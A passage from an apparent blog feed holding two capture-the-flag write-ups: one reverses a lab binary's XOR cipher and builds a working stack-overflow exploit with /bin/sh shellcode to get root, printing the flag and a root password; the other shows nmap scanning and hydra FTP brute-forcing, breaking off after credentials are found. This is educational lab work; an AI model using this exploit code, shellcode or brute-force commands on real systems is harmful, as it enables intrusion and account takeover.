0020| 0xbffff3d4 (&ldquo;Ux7;&lt;\243\211T</em>U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL<sup>F</sup>\275\351D;\251\376~\246b\a\006Wҩ>\001\330Zn\242T\273wO\245uK\251\364?>\362\005$1\016k\371\035\&rdquo;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337>\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&ldquo;l\311+\203˃&amp;\322t\217 BG\202\006&rdquo;&hellip;)
0024| 0xbffff3d8 &mdash;> 0x5489a33c
0028| 0xbffff3dc &mdash;> 0x3997552a
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0675c916 in ?? ()
gdb-peda$
```</p>

<p>Ow. Ok, so we don&rsquo;t crash with a clean <em>0x41414141</em> as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.</p>

<h2>planning a exploit</h2>

<p>So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs <strong>after</strong> the encryption function (remember <code>xcrypt</code>?) has run and wants to write the output to file (this is an assumption though).</p>

<p>Ok. So. Make sure you focus now :)</p>

<p>We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our <em>A</em> buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our <em>A</em> buffer as we have just observed it crash before the output is written.</p>

<p>So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our <em>A</em> buffer long enough, then we can feed that to <code>tfc</code> and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering <code>tfc</code> had no security as part of the compilation, maybe execute some shell code on the stack.</p>

<p>Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in <code>xcrypt()</code> to get started. Something I have practically 0 experience in.</p>

<h2>reversing xcrypt()</h2>

<p><em>For this part, I have to give a <strong>big</strong> high five to <a href="https://twitter.com/recrudesce">@recrudesce</a> for helping me understand parts of the pseudo code.</em></p>

<p>Right. Essentially, in order for us to better understand what exactly is happening within <code>xcrypt()</code>, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its <em>reaaaaaly</em> hard to comprehend), but it <em>really</em> helps in getting the mind to understand the flow.</p>

<p>For the pseudo code, I downloaded a demo version of <a href="http://www.hopperapp.com/">Hopper</a>. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded <code>tfc</code>, located the <code>xcrypt()</code> function and slapped the Pseudo code generation button:</p>

<p><img class="<a" src="href="https://i.imgur.com/VPUDXvo.png">https://i.imgur.com/VPUDXvo.png</a>"></p>

<p>While looking around for pseudo code generation options, I came across the <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a> online service, which had the following image as a control flow graph for the calls in <code>xcrypt()</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/cT7i3ob.png">https://i.imgur.com/cT7i3ob.png</a>"></p>

<p>Armed this this graph and the pseudo code, I was ready to start writing a python version of it.</p>

<p>I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.</p>

<p><code>c
int xcrypt(int arg0, int arg1) {
</code></p>

<p>We start by declaring the fuction <code>xcrypt()</code>. <code>xcrypt()</code> takes 2 arguments. From inspecting the the parent function <code>cryptFile()</code> that calls <code>xcrypt()</code>, we can see the 2 arguments passed to <code>xcrypt()</code> is the file content and the length of the content respectively. So, <code>arg0</code> is the content and <code>arg1</code> is the content length.</p>

<p>```c</p>

<pre><code>var_C = 0xea1ab19f;
var_10 = arg_0;
var_4 = 0x0;
</code></pre>

<p>```</p>

<p>Here we have 3 variable assignments occur. <code>var_C</code> is set to <code>0xea1ab19f</code>, <code>var_10</code> is set to the file content from <code>arg0</code> and <code>var_4</code> is set to 0.</p>

<p>```c</p>

<pre><code>while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
        *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
</code></pre>

<p>```</p>

<p>This part has one bit that may be very confusing. Comparing this to other output from say IDA and <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a>, we will see that the <code>arg_4</code> referred to here is actually the length of the content, so <code>arg1</code> then.</p>

<p>With that out the way, we see the start of a while loop for <code>arg_4 &gt;&gt; 0x2</code>, which translates to <code>len(content) &gt;&gt; 2</code>, which essentially just means <code>len(content) / 4</code>. While the output of this bitwise right shift is larger than <code>var_4</code>, which is 0 at the start, the loop will continue.</p>

<p>Once inside the loop (and this is the part that for me was the hardest!!!) we see the line <code>*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</code>. What helped me understand what is going on here was to understand that <code>var_10</code> (which is the content of our file) is being passed by reference. So, <code>var_4 * 4</code> is essentially <code>i*4</code> of the contents, or <code>content[i*4]</code> in python, which is the 4 bytes from <code>var_4</code>. These 4 bytes are being xored by <code>var_C</code>, replacing the original 4 bytes in <code>var_10</code>, to the new xored ones.</p>

<p>So what can we deduce then? The hardcoded base encryption key for <code>tfc</code> is <code>0xea1ab19f</code>. Cool eh! But ok lets move on.</p>

<p>```c</p>

<pre><code>        var_8 = 0x0;
        while (var_8 &lt;= 0x7) {
                if ((var_C &amp; 0x1) != 0x0) {
                        var_C = var_C &gt;&gt; 0x1;
                        var_C = var_C ^ 0x6daa1cf4;
                }
                else {
                        var_C = var_C &gt;&gt; 0x1;
                }
                var_8 = var_8 + 0x1;
        }
        var_4 = var_4 + 0x1;
}
</code></pre>

<p>```</p>

<p>Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from <code>while (0x0 &lt;= 0x7) {</code>.</p>

<p>Once the loop has started, we see a bitwise <code>and</code> occur that checks if the key (<code>var_C</code>) &amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with <code>0x6daa1cf4</code>. Why <code>0x6daa1cf4</code>? Well, should the key ever become <code>1111 1111 1111 1111</code> (in binary), then any bitshifts will have no effect. If the <code>and</code> does not result in 0, just shift the bits.</p>

<p>This occurs for 8 runs.</p>

<p>So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.</p>

<p>Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.</p>

<p>That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)</p>

<p>```c</p>

<pre><code>var_14 = arg_4 &amp; 0xfffffffc;
var_4 = 0x0;
while ((arg_4 &amp; 0x3) &gt; var_4) {
        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);
        var_C = var_C &gt;&gt; 0x8;
        var_4 = var_4 + 0x1;
}
return 0x0;
</code></pre>

<p>}
```</p>

<h2>the encryption logic replicated</h2>

<p>While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import struct</p>

<h1>Hopper Pseudo Code</h1>

<h1>int xcrypt(int arg0, int arg1) {</h1>

<h1>var_C = 0xea1ab19f;</h1>

<h1>var_10 = arg_0;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while (arg_4 >> 0x2 > var_4) {</h1>

<h1><em>(var_4 * 0x4 + var_10) = </em>(var_10 + var_4 * 0x4) ^ var_C;</h1>

<h1>var_8 = 0x0;</h1>

<h1>while (var_8 &lt;= 0x7) {</h1>

<h1>if ((var_C &amp; 0x1) != 0x0) {</h1>

<h1>var_C = var_C >> 0x1;</h1>

<h1>var_C = var_C ^ 0x6daa1cf4;</h1>

<h1>}</h1>

<h1>else {</h1>

<h1>var_C = var_C >> 0x1;</h1>

<h1>}</h1>

<h1>var_8 = var_8 + 0x1;</h1>

<h1>}</h1>

<h1>var_4 = var_4 + 0x1;</h1>

<h1>}</h1>

<h1>var_14 = arg_4 &amp; 0xfffffffc;</h1>

<h1>var_4 = 0x0;</h1>

<h1>while ((arg_4 &amp; 0x3) > var_4) {</h1>

<h1><em>(int8_t </em>)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ <em>(int8_t </em>)(arg_0 + var_14 + var_4) &amp; 0xff);</h1>

<h1>var_C = var_C >> 0x8;</h1>

<h1>var_4 = var_4 + 0x1;</h1>

<h1>}</h1>

<h1>return 0x0;</h1>

<h1>}</h1>

<p>def xcrypt(content, length):</p>

<pre><code>encrypted = ''

# set the base encryption key. this mutates with each pass
key = 0xea1ab19f    # var_C = 0xea1ab19f;

for word in range(length &gt;&gt; 2): # while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
    # apply the encryption logic as can bee seen in
    # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;

    # grab the 4 bytes we working with
    bytes = content[word*4:((word*4)+4)]

    # struct unpack_from returns a tuple, we want 0 so that
    # we end up with something we can xor
    long_to_xor = struct.unpack_from('&lt;L', bytes)[0]

    # apply the xor, this is the actual encryption part
    encrypted_bytes = long_to_xor ^ key

    # append the 4 encrypted bytes by packing them
    encrypted += struct.pack('&lt;L',encrypted_bytes)

    # next we run the key mutation 
    for mutation in xrange(8):

        # no mutation is possible of the key is 1111 1111 1111 1111
        if (key &amp; 1) != 0:
            key = key &gt;&gt; 1
            key = key ^ 0x6daa1cf4
        else:
            key = key &gt;&gt; 1  

return encrypted;
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># set the content that we want to encrypt
content = "A" *1000
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<h2>testing the script</h2>

<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>

<p>```bash
root@kali:~# python make-crypt.py > test.tfc</p>

<p>root@kali:~# head test.tfc
��[�]��C��dl�</p>

<pre><code>          H)�Aotg�\!�E?�̀l+�B��$f5%�&amp;�y�|S[I;R.�+T��w�$͟�7��?i�w'�3�s&lt;A��^��
</code></pre>

<p>root@kali:~# ./tfc test.tfc out.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>root@kali:~# head out.tfc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```</p>

<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>

<h2>finding EIP</h2>

<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.</p>

<p>gdb-peda$ r crash.tfc crash-out.tfc</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;registers&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
EAX: 0x0
EBX: 0xb7fbfff4 &mdash;> 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&lsquo;\t&rsquo;)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 (&lsquo;AAAA&rsquo;)
ESP: 0xbffff3d0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
EIP: 0x41414141 (&lsquo;AAAA&rsquo;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
Invalid $PC address: 0x41414141
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0xbffff3d0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0004| 0xbffff3d4 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0008| 0xbffff3d8 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0012| 0xbffff3dc (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0016| 0xbffff3e0 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0020| 0xbffff3e4 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0024| 0xbffff3e8 (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
0028| 0xbffff3ec (&lsquo;A&rsquo; <repeats 200 times>&hellip;)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
```</p>

<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>

<p>```bash
root@kali:~# python make-crypt.py > crash.tfc</p>

<p>root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r crash.tfc crash-out.tfc</p>

<p>[&hellip; snip &hellip;]</p>

<p>Stopped reason: SIGSEGV
0x35684634 in ?? ()
gdb-peda$
```</p>

<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>

<p><code>bash
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
[*] Exact match at offset 4124
</code></p>

<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>

<p><code>bash
content = "A" *4124 + "BBBB" + "C"*(6000-4124-4)
</code></p>

<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>

<h2>exploiting tfc</h2>

<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>

<p><img class="<a" src="href="https://i.imgur.com/Mqkfe8l.png">https://i.imgur.com/Mqkfe8l.png</a>"></p>

<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>

<p><code>bash
content = "A" *4124 + "\x93\x8e\x04\x08" + "C"*(6000-4124-4)
</code></p>

<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>

<p>```python
if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code># 08048e93  ; jmp esp
shellcode = (
    "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68" +
    "\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
)

content = "A" *4124 + "\x93\x8e\x04\x08" + "\x90"*16 + shellcode + "C" *(6000-4124-4-16-len(shellcode))
length = len(content)

encrypted = xcrypt(content, length)
print encrypted
</code></pre>

<p>```</p>

<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>

<p>```bash
jason@knockknock:~$ python make-crypt.py > crash.tfc &amp;&amp; ./tfc crash.tfc crash-out.tfc</p>

<h1>id</h1>

<p>uid=0(root) gid=1000(jason) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
```</p>

<p>pwnd!</p>

<p>As proof, the flag:</p>

<p>```bash</p>

<h1>cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt</h1>

<hr />

<p>|  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong>         |  | <strong> </strong><strong>   </strong><strong>   </strong><strong> |  | </strong> /<em>   |
|  |/ //    \ /  _ _/ </em><strong>\|  |/ /  </strong><em><strong><em> |  |/ //    \ /  _ _/ </em></strong>\|  |/ /  |   |
|    &lt;|   |  (  &lt;</em>> )  _<strong>|    &lt;  /</strong><strong><em>/ |    &lt;|   |  (  &lt;</em>> )  _</strong>|    &lt;   |   |
|<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \         |<strong>|_ _</strong>|  /_<em><strong>/ _</strong>  >__|</em> \  |___|</p>

<pre><code> \/    \/            \/     \/              \/    \/            \/     \/       
</code></pre>

<p>Hooray you got the flag!</p>

<p>Hope you had as much fun r00ting this as I did making it!</p>

<p>Feel free to hit me up in #vulnhub @ zer0w1re</p>

<p>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)</p>

<p>root password is &ldquo;qVx4UJ*zcUdc9#3C$Q&rdquo;, but you should already have a shell, right? ;)
```</p>

<p>There are a number other goodies in /root to check out so be sure to do that!</p>

<h2>conclusion</h2>

<p>Big shoutout to <a href="https://twitter.com/zer0w1re">@zer0w1re</a> for the VM and as always <a href="https://twitter.com/vulnhub">@VulnHub</a> for the hosting. The learning experience has been invaluable! :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[another troll tamed - solving troll 2]]></title>
    <link href="http://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/"/>
    <updated>2014-10-10T17:32:35+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p><a href="">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>

<p>Here is my experience taming the troll, again.</p>

<!--more-->


<h2>getting started</h2>

<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>

<p>```bash
root@kali:~/Desktop/troll2# nmap -sV &mdash;reason 192.168.56.101</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-10 06:55 SAST
Nmap scan report for 192.168.56.101
Host is up, received reset (0.00031s latency).
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
```</p>

<p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>

<h2>web server</h2>

<p>Opening up a browser to <a href="http://192.168.56.101">http://192.168.56.101</a> revealed a familiar image:</p>

<p><img class="<a" src="href="https://i.imgur.com/7lyyzPS.png">https://i.imgur.com/7lyyzPS.png</a>">
Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>

<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>

<p><code>bash
/keep_trying
/dont_bother
/noob
/ok_this_is_it
</code></p>

<p>The content served up at these URLs:</p>

<p><img class="<a" src="href="https://i.imgur.com/yH4vTKx.png">https://i.imgur.com/yH4vTKx.png</a>"></p>

<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>

<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>

<p>```bash
root@kali:~# for line in $(cat 200.txt); do echo &ldquo;==>$line&lt;==&rdquo; &amp;&amp; wget 192.168.56.101/$line/cat_the_troll.jpg; done</p>

<p>==>/ok_this_is_it&lt;==
&mdash;2014-10-10 07:31:37&mdash;  <a href="http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg">http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg</a>
Connecting to 192.168.56.101:80&hellip; connected.
HTTP request sent, awaiting response&hellip; 200 OK
Length: 15831 (15K) [image/jpeg]
Saving to: `cat_the_troll.jpg.3'</p>

<p>100%[=======>] 15,831      &mdash;.-K/s   in 0s</p>

<p>2014-10-10 07:31:37 (191 MB/s) &ndash; `cat_the_troll.jpg.3' saved [15831/15831]
```</p>

<p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>

<p><code>bash
root@kali:~# ls -l
total 68
-rw-r--r-- 1 root root    47 Oct 10 07:31 200.txt
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg
-rw-r--r-- 1 root root 15873 Oct  4 10:31 cat_the_troll.jpg.1 #&lt;---
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.2
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.3
</code></p>

<p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>

<p><code>bash
root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
</code></p>

<p>Sweet, so lets print the last line of both and check what the diff is:</p>

<p>```bash
root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
8�z2��p�T�lj\p��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_�</p>

<p>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
8�z2��p�T�lj\p��?�&lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_��Look Deep within y0ur_self for the answer
```</p>

<p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>

<p><img class="<a" src="href="https://i.imgur.com/oNInvrf.png">https://i.imgur.com/oNInvrf.png</a>"></p>

<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>

<p><code>bash
root@kali:~# head answer.txt
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
</code></p>

<p>Looks a lot like base64 hey? Lets try decode it:</p>

<p><code>bash
root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
</code></p>

<p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>

<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>

<p>My guess was that this has to be a password for either the FTP or SSH service.</p>

<h2>ftpee</h2>

<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>

<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>

<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz |  tr "\"' " '\n' | sort -u &gt;&gt; words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href="https://gist.github.com/leonjza/db5cc19cd62b270a89db">here</a></p>

<p>And finally, it was time to let hydra on the loose.</p>

<p>```
root@kali:~# hydra -v -V -F -L words -P words -t 30 <a href="ftp://192.168.56.101">ftp://192.168.56.101</a>
Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak &ndash; for legal purposes only</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-10-10 08:11:50
[DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses &hellip; done
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;>&rdquo; &ndash; pass &ldquo;>&rdquo; &ndash; 1 of 13689 [child 0]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;>&rdquo; &ndash; pass &ldquo;404&rdquo; &ndash; 2 of 13689 [child 1]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;>&rdquo; &ndash; pass &ldquo;again&rdquo; &ndash; 3 of 13689 [child 2]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;>&rdquo; &ndash; pass &ldquo;agent&rdquo; &ndash; 4 of 13689 [child 3]
[&hellip;]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;Tr0ll&rdquo; &ndash; pass &ldquo;Tr0ll&rdquo; &ndash; 10621 of 13689 [child 4]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;Tr0ll&rdquo; &ndash; pass &ldquo;tr0ll2&rdquo; &ndash; 10622 of 13689 [child 8]
[ATTEMPT] target 192.168.56.101 &ndash; login &ldquo;Tr0ll&rdquo; &ndash; pass &ldquo;tr0ll_again.jpg&rdquo; &ndash; 10623 of 13689 [child 23]
[21][ftp] host: 192.168.56.101   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
